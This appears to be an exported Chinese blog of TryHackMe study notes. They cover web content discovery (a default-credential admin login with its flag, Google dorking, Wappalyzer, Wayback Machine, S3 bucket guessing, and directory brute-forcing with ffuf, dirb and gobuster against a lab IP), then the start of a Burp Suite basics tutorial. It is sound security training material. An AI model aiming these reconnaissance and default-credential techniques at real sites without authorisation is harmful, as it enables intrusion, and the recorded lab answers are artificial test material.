<h2 id="手动发现网站内容-Framework-Stack（框架堆栈）"><a href="#手动发现网站内容-Framework-Stack（框架堆栈）" class="headerlink" title="手动发现网站内容-Framework Stack（框架堆栈）"></a>手动发现网站内容-Framework Stack（框架堆栈）</h2><p><strong>框架堆栈</strong></p>
<p>一旦你确认了目标网站正在使用的网站框架，无论是从上面的 favicon 示例中，还是通过在页面源码中寻找诸如comments、版权声明或credits等线索，你可以尝试找到关于网站框架的来源网站，然后我们就可以了解有关该框架的更多信息，以便我们发现更多关于目标网站的内容。</p>
<p>查看我们的 Acme IT Support 网站 (示例目标站点) 的页面源码，你会在末尾看到一条评论，其中包含了该页面加载时间以及一个指向框架来源网站的链接。 让我们查看框架的来源网站。 框架来源网站的文档页面为我们提供了关于框架管理门户的路径，我们可以在Acme IT Support 网站上访问该路径，从而帮助我们在本次实验环境下获取一个flag。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112192819557.png"
                      alt="image-20221112192819557"
                ></p>
<p>查看目标站点的页面源代码，获取指向框架来源网站的链接：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112192923204.png"
                      alt="image-20221112192923204"
                ></p>
<blockquote>
<p><a class="link"   href="https://static-labs.tryhackme.cloud/sites/thm-web-framework" >https://static-labs.tryhackme.cloud/sites/thm-web-framework <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>访问框架来源网站，得知关于框架管理门户的路径：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112193105657.png"
                      alt="image-20221112193105657"
                ></p>
<p>访问框架管理门户路径，登录并获取flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112193244988.png"
                      alt="image-20221112193244988"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112193401044.png"
                      alt="image-20221112193401044"
                ></p>
<blockquote>
<p>THM{CHANGE_DEFAULT_CREDENTIALS}</p>
</blockquote>
<h2 id="OSINT-开源情报-Google-Hacking-Dorking"><a href="#OSINT-开源情报-Google-Hacking-Dorking" class="headerlink" title="OSINT(开源情报)-Google Hacking &#x2F; Dorking"></a>OSINT(开源情报)-Google Hacking &#x2F; Dorking</h2><p>还有一些外部资源可以帮助你发现有关目标网站的信息，这些资源通常被称为 OSINT 或开源情报，因为它们是收集信息的免费工具。</p>
<p><strong>Google Hacking &#x2F; Dorking（谷歌Hack语法）</strong></p>
<p>Google hacking &#x2F; Dorking (谷歌Hack语法)能够利用 Google 的高级搜索引擎功能，从而允许你搜索一些自定义内容。 </p>
<p>你可以通过使用谷歌Hack语法<code>site: </code>从某个域名中筛选搜索结果，例如 (<code>site:tryhackme.com</code>) ；你也可以将该语法与某些搜索词进行匹配，例如 <code>admin</code> (<code>site:tryhackme.com admin</code>) ，这会返回来自 tryhackme.com 网站且内容中包含单词<code>admin</code>的搜索结果。 </p>
<p>你也可以组合多个过滤器（filters）语法，以下是关于更多过滤器（filters ）使用的示例：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112194042224.png"
                      alt="image-20221112194042224"
                ></p>
<p>更多关于谷歌Hacking的信息可以在这里找到： <a class="link"   href="https://en.wikipedia.org/wiki/Google_hacking" >https://en.wikipedia.org/wiki/Google_hacking <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112194824729.png"
                      alt="image-20221112194824729"
                ></p>
<h2 id="OSINT-开源情报-Wappalyzer"><a href="#OSINT-开源情报-Wappalyzer" class="headerlink" title="OSINT(开源情报)-Wappalyzer"></a>OSINT(开源情报)-Wappalyzer</h2><p><strong>Wappalyzer</strong></p>
<p>Wappalyzer ( <a class="link"   href="https://www.wappalyzer.com/" >https://www.wappalyzer.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ) 是一个在线工具和浏览器扩展程序，可以帮助识别当前网站正在使用的IT技术，例如网站框架、内容管理系统 (CMS)、支付处理器等等，它也可以发现网站当前运行的应用程序的版本号。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112195208423.png"
                      alt="image-20221112195208423"
                ></p>
<h2 id="OSINT-开源情报-Wayback-Machine"><a href="#OSINT-开源情报-Wayback-Machine" class="headerlink" title="OSINT(开源情报)- Wayback Machine"></a>OSINT(开源情报)- Wayback Machine</h2><p><strong>Wayback Machine</strong></p>
<p>Wayback Machine ( <a class="link"   href="https://archive.org/web/" >https://archive.org/web/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> )是一个可追溯到 90 年代后期的网站历史档案，你可以在该网站上搜索一个域名，它会显示该网站服务抓取网页并保存内容的所有历史时间。该网站服务可以帮助我们发现在当前网站上可能仍处于活动状态的一些旧页面。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112195513239.png"
                      alt="image-20221112195513239"
                ></p>
<h2 id="OSINT-开源情报-GitHub"><a href="#OSINT-开源情报-GitHub" class="headerlink" title="OSINT(开源情报)- GitHub"></a>OSINT(开源情报)- GitHub</h2><p><strong>GitHub</strong></p>
<p>要了解 GitHub，首先需要了解 Git。 </p>
<p>Git 是一个版本控制系统（<strong>version control system</strong>），用于跟踪项目中文件的更改情况。 这使得团队工作变得更容易，因为你可以看到每个团队成员正在编辑的内容以及他们对文件所做的一些更改。 当 Git 用户完成文件更改后，他们会通过一条消息提交它们，然后将它们推送回项目中心位置（存储库），以供其他用户将这些更改拉到他们的本地计算机上。</p>
<p>GitHub 是托管在互联网上的 Git 版本。 GitHub 上的存储库可以设置为公共或私有，并具有各种访问控制功能。 你可以使用 GitHub 的搜索功能来查找公司名称或网站名称，以尝试找到属于目标网站的存储库。 一旦有所发现，你就可以访问你尚未找到的目标网站或者目标框架的源代码、目标可能使用的默认密码或其他内容。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112195607052.png"
                      alt="image-20221112195607052"
                ></p>
<h2 id="OSINT-开源情报-S3-Buckets（S3存储桶）"><a href="#OSINT-开源情报-S3-Buckets（S3存储桶）" class="headerlink" title="OSINT(开源情报)- S3 Buckets（S3存储桶）"></a>OSINT(开源情报)- S3 Buckets（S3存储桶）</h2><p><strong>S3 Buckets（S3存储桶）</strong></p>
<p>S3 Buckets 是 Amazon AWS 提供的一种存储服务，它允许人们将文件或者静态网站内容保存在云中，然后可以通过 HTTP 和 HTTPS 进行访问操作。 文件的所有者可以设置访问权限以使文件公开、私有甚至可写。 有时这些访问权限设置并不正确，文件所有者可能在无意中设置 允许访客访问不应向公众提供的文件。</p>
<p>S3 存储桶的格式为 <code>http(s)://&#123;name&#125;.s3.amazonaws.com </code>，其中<code>&#123;name&#125;</code>由所有者自己决定，例如<code>tryhackme-assets.s3.amazonaws.com</code>。 </p>
<p>我们可以通过多种方式发现 S3 存储桶，例如在网站的页面源码中、在GitHub 存储库中查找目标URL，我们甚至能够自动化进行发现S3 存储桶的过程。</p>
<p>一种常见的自动化发现S3 Buckets的方法是：使用公司名称后跟常用术语自行拼接url，例如 <code>&#123;name&#125;-assets</code>、<code>&#123;name&#125;-www</code>、<code>&#123;name&#125;-public</code>、<code>&#123;name&#125;-private</code> 等，后面跟上<code>.s3.amazonaws.com</code>进行url拼接即可。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112201149334.png"
                      alt="image-20221112201149334"
                ></p>
<h2 id="自动发现网站内容"><a href="#自动发现网站内容" class="headerlink" title="自动发现网站内容"></a>自动发现网站内容</h2><p><strong>什么是自动发现？</strong></p>
<p>自动发现是一个使用工具发现网站内容而不是手动发现网站内容的过程。 </p>
<p>此过程是自动化的，因为它通常会发送针对目标 Web 服务器的数百、数千甚至数百万个请求，这些请求会检查目标网站上是否存在某些文件或某些目录，以便让我们能够访问我们之前未知其存在的相关资源。 这个过程需要通过使用一种叫做wordlists（字典）的资源来实现。</p>
<p><strong>什么是wordlists（字典）？</strong></p>
<p>字典是包含一长串常用词的文本文件，它们可以涵盖许多不同的用例，例如，密码字典将包括最常用的密码列表；而在本例中我们需要一个包含最常用目录和文件名的字典。 </p>
<p>预装在 THM AttackBox 上的字典资源是 <a class="link"   href="https://github.com/danielmiessler/SecLists" >https://github.com/danielmiessler/SecLists <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 该字典项目由Daniel Miessler维护。</p>
<p><strong>自动化工具</strong></p>
<p>有许多不同的网站内容发现工具可用，它们都有各自的功能和缺陷，我们将介绍三种预装在我们的 AttackBox 上的工具：ffuf、dirb 和 gobuster。</p>
<p>在 AttackBox 上执行以下三个命令，针对的目标为 Acme IT Support 网站，看看你会得到什么结果。</p>
<p><strong>使用ffuf进行网站内容发现:</strong></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@machine$ </span><span class="language-bash">ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ</span></span><br></pre></td></tr></table></figure></div>

<p><strong>使用dirb进行网站内容发现：</strong></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@machine$ </span><span class="language-bash">dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt</span></span><br></pre></td></tr></table></figure></div>

<p><strong>使用Gobuster进行网站内容发现：</strong></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@machine$ </span><span class="language-bash">gobuster <span class="built_in">dir</span> --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt</span></span><br></pre></td></tr></table></figure></div>

<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112212602677.png"
                      alt="image-20221112212602677"
                ></p>
<p>使用上面介绍的三个工具之一，回答问题：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir --url http://10.10.166.98/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221112213507581.png"
                      alt="image-20221112213507581"
                ></p>
<blockquote>
<p>&#x2F;monthly</p>
<p>&#x2F;development.log</p>
</blockquote>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Burp Suite：The Basics(Burp Suite基础·更新版)-学习</title>
    <url>/2024/01/27/THM-Burp%20Suite%EF%BC%9AThe%20Basics(Burp%20Suite%E5%9F%BA%E7%A1%80%C2%B7%E6%9B%B4%E6%96%B0%E7%89%88)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/burpsuitebasics" >https://tryhackme.com/room/burpsuitebasics <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：介绍如何使用 Burp Suite 进行 Web 应用程序渗透测试。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>本文旨在了解Burp Suite web应用程序安全测试框架的基础知识。文章内容将重点围绕以下几个主要方面展开：</p>
<ul>
<li>全面介绍Burp Suite；</li>
<li>全面概述Burp Suite框架中可用的各种工具；</li>
<li>有关在系统上安装Burp Suite的过程的详细指南(正版安装手段)；</li>
<li>导航和配置Burp Suite。</li>
</ul>
<p>我们还将介绍Burp Suite框架的核心，即Burp Proxy(Burp 代理)。</p>
<p>本文所涉及的内容主要是关于Burp Suite的基础知识，所以文中的理论知识部分会更多一些。</p>
<h2 id="什么是Burp-Suite？"><a href="#什么是Burp-Suite？" class="headerlink" title="什么是Burp Suite？"></a>什么是Burp Suite？</h2><p>从本质上讲，Burp Suite是一个基于Java的框架，旨在作为进行Web应用程序渗透测试的综合解决方案。Burp Suite已经成为针对Web和移动(mobile )应用程序包括依赖于应用程序编程接口(APIs)的应用程序进行实际安全评估的行业标准工具。</p>
<p>简而言之，Burp Suite可以捕获并操作浏览器和Web服务器之间的所有HTTP&#x2F;HTTPS流量，这一基本功能构成了Burp Suite框架的主干。在拦截web请求之后，用户可以灵活地将它们发送到Burp Suite框架内的各种组件中，我们将在下文内容中对此进行探讨。</p>
<p>Burp Suite可以在Web请求到达目标服务器之前拦截、查看和修改Web请求(requests)，甚至可以在浏览器接收到响应之前对响应消息(responses)进行操作，这种能力使得Burp Suite成为手动测试Web应用程序的宝贵工具。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231219214927327.png"
                      alt="image-20231219214927327"
                ></p>
<p>Burp Suite有不同版本，在本文中我们将重点使用和介绍Burp Suite社区版，该版本可以在法律规定的范围内免费用于任何非商业用途；此外，Burp Suite还为用户提供了专业版和企业版，这两个版本都需要用户支付一定的许可费用，但与此同时它们也拥有一些强大的额外功能：</p>
<ol>
<li><p>Burp Suite专业版——我们可以把Burp Suite专业版理解为不受限制的Burp Suite社区版本，它具有以下功能：</p>
<ul>
<li>能够作为一个自动化的漏洞扫描器（拥有Scanner功能模块）；</li>
<li>能够作为一个不受速率限制的模糊器(fuzzer)&#x2F;暴力破解攻击器(bruteforcer)；</li>
<li>能够保存项目以供将来使用，并且能够生成报告；</li>
<li>拥有允许与其他工具集成的内置API；</li>
<li>能够不受限制地访问并添加新的扩展模块，从而让Burp Suite获得更强大的功能；</li>
<li>可以访问Burp Suite Collaborator(协作器)，从而能有效地提供一个自托管或运行在Portswigger所拥有的服务器上的独特的请求捕获器。</li>
</ul>
<p>简而言之，Burp Suite Pro是一个非常强大的工具，这就是为什么它的一年订阅费为319英镑&#x2F; 399美元；Burp Pro通常供专业人士使用(相关的工具许可证通常可由渗透测试人员的雇主提供)，是Web渗透测试领域专业人士的首选。</p>
</li>
<li><p>Burp Suite企业版——与社区版和专业版相比，Burp Suite企业版主要用于持续扫描，它能提供一个自动扫描器，从而可以定期扫描目标web应用程序是否存在漏洞，这类似于使用Nessus等工具来执行自动基础设施扫描；其他版本的Burp Suite通常是允许用户在本地计算机上执行手动渗透测试，而企业版的Burp则不同，它驻留在服务器上，并能不断扫描目标web应用程序是否存在潜在漏洞。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231219221205712.png"
                      alt="image-20231219221205712"
                ></p>
</li>
</ol>
<h3 id="答题"><a href="#答题" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>请阅读本小节内容并回答以下问题：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230407083518499.png"
                      alt="image-20230407083518499"
                ></p>
<h2 id="Burp-Suite社区版的功能"><a href="#Burp-Suite社区版的功能" class="headerlink" title="Burp Suite社区版的功能"></a>Burp Suite社区版的功能</h2><p>虽然与Burp Suite专业版对比，Burp Suite社区版提供的功能集更为有限，但它仍然提供了一系列可用的优秀功能模块，主要有：</p>
<ul>
<li>Proxy(代理)：Proxy允许我们在与Web应用程序交互时拦截、查看和修改web请求&#x2F;响应(requests&#x2F;responses)；它是一个能够拦截 HTTP&#x2F;HTTPS消息的代理服务器，能够作为一个在浏览器和目标Web应用程序之间的中间人。</li>
<li>Repeater(中继器、转发器、重放器)：Repeater允许我们在捕获、修改web请求之后，实现多次重新发送同一Web请求；这个模块的功能绝对是无价的，特别是当我们需要通过反复试验来构建payload(如测试SQL注入漏洞)或者在测试端点的功能缺陷时。</li>
<li>Intruder(入侵者、攻击器)：虽然在Burp Suite社区版中严格限制了发送请求的速率，但Intruder仍允许我们(在速率限制内)向目标端点喷洒请求；这个功能通常用于暴力破解攻击或者对端点进行模糊测试。</li>
<li>Decoder(解码器)：这个模块能够充当一个解码器以帮助转换数据格式，Decoder既可以解码Burp Suite所捕获的信息，又能在将payload发送到目标之前对其进行编码；虽然其他工具也可以完成数据格式转换，但直接在Burp Suite中使用Decoder来完成这项工作会更加高效。</li>
<li>Comparer(对比器、比较器)：这个模块可以充当一个比较器，Comparer允许我们在字符级别或字节级别上比较两个数据片段；虽然这项工作也能通过使用其他工具来完成，但是使用Burp Suite的Comparer模块来完成”数据比较”会更加高效。</li>
<li>Sequencer(定序器)：这个模块能够充当定序器，我们通常可使用Sequencer来评估令牌(tokens)的随机性，比如评估会话的cookie值或者其他假定随机生成的数据值；如果目标Web应用程序用于生成这些值的算法缺乏安全随机性，那么就可能会向攻击者暴露一些毁灭性的攻击途径。</li>
<li>Spider(蜘蛛爬虫)：Spider能够充当网络爬虫，它能用于爬取目标web应用程序的内容信息和功能信息。</li>
</ul>
<p>除了内置功能模块之外，我们还可以编写一些扩展来增加Burp Suite框架的功能，我们通常可以用Java、Python(使用Java <a class="link"   href="https://www.jython.org/" >Jython <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>解释器)、Ruby(使用Java <a class="link"   href="https://www.jruby.org/" >JRuby <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>解释器)来编写Burp Suite扩展。</p>
<p>通过Burp Suite的Extender模块可以快速轻松地将扩展加载到Burp框架中，Extender模块还提供了一个可以下载第三方模块的商店(被称为BApp Store)。虽然许多扩展都需要Burp专业版的许可证才能进行下载和添加，但仍有相当数量的扩展可以与Burp社区版免费集成，例如，我们可以使用<a class="link"   href="https://github.com/nccgroup/LoggerPlusPlus" >Logger++扩展 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>来强化Burp Suite的内置日志功能。</p>
<h3 id="答题-1"><a href="#答题-1" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>通过阅读本小节内容，可帮助我们回答以下问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231221000858388.png"
                      alt="image-20231221000858388"
                ></p>
<h2 id="安装Burp-Suite社区版"><a href="#安装Burp-Suite社区版" class="headerlink" title="安装Burp Suite社区版"></a>安装Burp Suite社区版</h2><p>Burp Suite是一种非常有用的工具，无论是用于web或移动应用程序评估、渗透测试、漏洞赏金狩猎，还是用于在Web应用程序开发时进行功能调试，随后我们将介绍在不同计算机系统平台上安装Burp Suite的指南。</p>
<p><strong>下载</strong></p>
<p>对于大多数操作系统，要下载最新的Burp Suite社区版，通常可以通过网页直接访问下载链接：<a class="link"   href="https://portswigger.net/burp/releases/" >https://portswigger.net/burp/releases/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Kali Linux操作系统：Burp Suite通常是预装在Kali Linux中的，如果你的Kali中缺少该工具，你可以轻松地使用命令从Kali apt 存储库中获取并安装它。</p>
<p>macOS和Windows操作系统：对于其他操作系统，Burp Suite的开发商<a class="link"   href="https://portswigger.net/" >PortSwigger <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>在<a class="link"   href="https://portswigger.net/burp/releases/" >相关下载页面 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>中提供了Community版和Professional版的专用安装程序，我们可以在下拉菜单中选择我们的操作系统类别，然后选择社区版进行下载即可。</p>
<p>tips：<a class="link"   href="https://portswigger.net/" >PortSwigger <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>官网能为多种操作系统提供专用的Burp Suite安装程序，因为Burp Suite是一个Java应用程序，所以它还可以作为JAR归档文件被下载，并且能够在任何支持Java运行时环境的计算机上有效运行。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231220105934069.png"
                      alt="image-20231220105934069"
                ></p>
<p><strong>安装</strong></p>
<p>在完成Burp Suite下载之后(建议验证已下载文件的完整性)，我们需要使用适合我们系统的方法来安装Burp Suite。</p>
<p>在Windows操作系统中，我们可以直接运行相关可执行文件来进行Burp安装；在Linux系统中，我们通常需要在终端界面执行相关脚本(命令中可能需要带<code>sudo</code>)来安装Burp。</p>
<p>注意:如果在Linux系统中安装Burp Suite，你可以自主选择使用或者不使用root用户权限来进行安装；如果你决定在执行脚本时不使用<code>sudo</code>, 那么Burp Suite将安装在你的主目录<code>~/BurpSuiteCommunity/BurpSuiteCommunity</code>中，并且相关的安装路径不会被添加到系统的<code>PATH</code>变量中。</p>
<p>Burp Suite的安装向导非常直观，无论你所使用的操作系统是什么，接受默认的安装建议通常会是安全的选择，但是仔细阅读安装程序说明也仍然不失为明智之举。</p>
<p>成功安装了Burp Suite之后，我们就可以启动该应用程序，在下一小节中，我们将探讨Burp suite的初始设置和配置。</p>
<h2 id="Burp-Suite-Dashboard-仪表面板"><a href="#Burp-Suite-Dashboard-仪表面板" class="headerlink" title="Burp Suite Dashboard(仪表面板)"></a>Burp Suite Dashboard(仪表面板)</h2><p>当我们打开Burp Suite并接受相应的默认条款时，我们会看到一个项目选择窗口：在Burp Pro中，此窗口将允许我们将新项目保存到磁盘，或者选择加载先前已保存的项目；然而，在Burp Suite社区版中，我们在这里所能做的就是点击”下一步”按钮。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231220212308871.png"
                      alt="image-20231220212308871"
                ></p>
<p>接下来的窗口将允许我们为Burp Suite选择配置，在大多数情况下，保持默认配置值即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231220212342541.png"
                      alt="image-20231220212342541"
                ></p>
<p>接着我们点击上图中的”Start Burp”，等待一段时间后将自动打开Burp Suite的主界面，第一次打开Burp Suite时，我们可能会看到一个带有教学性质的Learn页面，后继打开Burp Suite时，默认出现的会是Burp Suite Dashboard(仪表面板)界面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231220212644636.png"
                      alt="image-20231220212644636"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231220212851065.png"
                      alt="image-20231220212851065"
                ></p>
<p>简而言之，Dashboard界面分为四个象限区域：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230407134132092.png"
                      alt="image-20230407134132092"
                ></p>
<ol>
<li><p><strong>Tasks</strong>(任务)：左上角的Tasks菜单允许我们定义后台任务，这样当我们使用Burp Suite时会在后台执行既定任务；在Burp Suite社区版本中，我们可以使用默认的”Live passive crawl-动态被动爬取”任务来自动记录我们访问过的web页面，而Pro版本还允许我们在Task菜单中创建按需扫描任务。</p>
</li>
<li><p><strong>Event log</strong>(事件日志)：左下角的Event log会告诉我们关于Burp Suite已执行的操作的信息，例如启动代理，以及有关通过Burp建立的连接的详细信息。</p>
</li>
<li><p><strong>Issue Activity</strong>：右上角的Issue Activity部分专属于pro版本，当我们使用Burp Suite社区版时，我们将无法使用该部分；在专业版本中，Issue Activity部分会列出自动扫描器发现的所有漏洞，这些漏洞会根据严重程度进行排序，并会根据Burp Suite对”目标组件易受攻击”的确定程度进行过滤。</p>
</li>
<li><p><strong>Advisory</strong>：右下角的Advisory部分提供了关于已识别的漏洞的更多详细信息，包括参考资料、建议的漏洞修复措施，我们可以将这些信息导出到一个报告中；此部分在Burp Suite社区版中可能不会显示任何关于已识别的漏洞的信息。</p>
</li>
</ol>
<p>我们可以点击Issue Activity部分中的一个示例漏洞，然后Advisory部分就会出现一些和示例漏洞相关的信息：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230407144742713.png"
                      alt="image-20230407144742713"
                ></p>
<p>在Burp Suite的各个选项卡和窗口中，你会发现有一个帮助图标：内含一个问号的圆圈标志。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230407141157666.png"
                      alt="image-20230407141157666"
                ></p>
<p>点击帮助图标将打开一个包含对应部分帮助信息的新窗口，例如：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230407155054946.png"
                      alt="image-20230407155054946"
                ></p>
<p>如果你不知道Burp Suite中某个功能是干什么的，查看相关的帮助信息可能会非常有用。</p>
<h3 id="答题-2"><a href="#答题-2" class="headerlink" title="答题"></a>答题</h3><p>请阅读本小节内容并回答以下问题：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231220112609240.png"
                      alt="image-20231220112609240"
                ></p>
<h2 id="Burp-Suite界面导航"><a href="#Burp-Suite界面导航" class="headerlink" title="Burp Suite界面导航"></a>Burp Suite界面导航</h2><p>在默认情况下，Burp Suite的界面导航主要可以通过顶部菜单栏来完成，它允许我们在不同模块之间进行切换，并能让我们访问每个模块内的各种子选项卡，子选项卡会出现在模块主菜单栏正下方的小菜单栏中：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231220213216645.png"
                      alt="image-20231220213216645"
                ></p>
<p>Burp Suite界面导航包括：</p>
<p>1.模块选择：顶部菜单栏将显示Burp Suite中的可用模块，我们可以通过单击顶部菜单栏中的模块选项卡按钮来在每个模块之间进行切换。</p>
<p>2.子选项卡选择：如果我们所选定的功能模块有多个子选项卡，那么我们可以通过模块主菜单栏正下方出现的小菜单栏来访问它们；这些子选项卡通常包含一些特定于功能模块的设置和选项，例如我们可以在Burp Proxy模块中选择Proxy Intercept子选项卡。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231220214233620.png"
                      alt="image-20231220214233620"
                ></p>
<p>3.隐藏或分离选项卡：在较新版本的Burp Suite中，如果我们希望单独查看某一选项卡，那么我们可以用鼠标右键单击指定的模块选项卡，然后选择将该选项卡分离到单独的窗口中；如果我们想隐藏某一选项卡，也可以用鼠标右键单击指定的模块选项卡，然后选择将该选项卡隐藏起来。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231220220200150.png"
                      alt="image-20231220220200150"
                ></p>
<p>除了顶部的模块选择菜单栏之外，在Burp Suite中还可以使用快捷键来快速导航到一些关键的模块选项卡中：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230407143515687.png"
                      alt="image-20230407143515687"
                ></p>
<h3 id="答题-3"><a href="#答题-3" class="headerlink" title="答题"></a>答题</h3><p>请阅读本小节内容并回答以下问题：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231220214315696.png"
                      alt="image-20231220214315696"
                ></p>
<h2 id="Burp-Suite设置选项"><a href="#Burp-Suite设置选项" class="headerlink" title="Burp Suite设置选项"></a>Burp Suite设置选项</h2><p>在开始学习Burp Proxy之前，让我们先看一下可用于配置Burp Suite的设置选项(options)。</p>
<ul>
<li><strong>Global Settings</strong>(全局设置，也称为用户设置)：这些设置会影响整个Burp Suite，并会在每次启动Burp应用程序时应用，它们将为我们的Burp Suite环境提供基准配置，这些设置可以在Settings选项卡下面的”User-用户”选项中找到；</li>
<li><strong>Project Settings</strong>(项目设置)：这些设置特定于当前项目，并且仅在会话期间应用，但是因为Burp Suite社区版并不支持保持项目，所以当我们关闭Burp时，任何特定于项目的选项设置都将会自动丢失，这些设置可以在Settings选项卡下面的”Project-项目”选项中找到。</li>
</ul>
<p><em>tips：在较新版本的Burp Suite中，User选项和Project选项都在顶部菜单栏中的Settings选项卡的相关界面下。</em></p>
<p>简而言之：Global Settings将适用于我们每次打开Burp Suite时，而Project Settings则只能应用于某个具体的Burp项目；鉴于我们并不能在社区版的Burp Suite中保存Burp项目，我们的所设置的Project Settings将会在每次关闭Burp Suite时自动重置。</p>
<p>要访问Burp Suite的设置界面，我们需要单击顶部导航栏中的<strong>Settings</strong>按钮，这将为我们打开一个单独的设置窗口：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231220220938499.png"
                      alt="image-20231220220938499"
                ></p>
<p>下图显示了单独的设置窗口。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231220221028867.png"
                      alt="image-20231220221028867"
                ></p>
<p>在设置窗口中，我们可以在页面左侧找到一个菜单，此菜单允许我们在不同类型的设置之间切换，包括：</p>
<ol>
<li>Search(搜索)：允许我们使用关键字搜索特定设置。</li>
<li>Type filter(类型过滤器)：过滤关于用户和项目选项的设置。<ul>
<li>User：显示影响整个Burp Suite应用程序的设置，即用户设置。</li>
<li>Project：显示特定于当前项目的设置，即项目设置。</li>
</ul>
</li>
<li>Categories(类别)：允许我们按类别选择设置。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231220232135471.png"
                      alt="image-20231220232135471"
                ></p>
<p>值得注意的是，Burp Suite 中的许多功能模块都提供了有关特定类别设置的快捷方式，例如，Proxy模块的子选项卡包括了一个Proxy settings按钮，点击该按钮可以直接打开关于Proxy部分的设置窗口。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20231220232748507.png"
                      alt="image-20231220232748507"
                ></p>
